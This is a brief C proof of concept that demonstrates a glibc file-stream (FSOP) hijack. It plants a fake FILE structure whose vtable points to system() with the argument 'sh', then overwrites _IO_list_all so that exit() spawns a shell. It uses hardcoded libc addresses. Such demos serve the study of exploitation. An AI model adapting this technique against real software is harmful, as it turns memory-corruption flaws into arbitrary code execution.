#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>

#define libc_base 0x00007ffff7a0d000
#define io_list_all_off 0x3c5520  

int main()
{
	unsigned long libc_io_list_all=libc_base+io_list_all_off;
	printf("io_list_all points to %p.\n",(unsigned long *)(*(unsigned long *)libc_io_list_all));
	unsigned long *fakefp=malloc(0xd8);
	unsigned long *fakevtable=malloc(0x20);
	*(unsigned long *)((char *)fakefp+0xc0)=0;
	*(unsigned long *)((char *)fakefp+0x28)=1;
	*(unsigned long *)((char *)fakefp+0x20)=0;
	*(unsigned long *)((char *)fakefp+0xd8)=(unsigned long)fakevtable;

	*(fakevtable+3)=(unsigned long)(&system);
	memcpy(fakefp,"sh",3);
	
	*(unsigned long *)libc_io_list_all=(unsigned long)fakefp;
	exit(0);
	
	
	
	
}
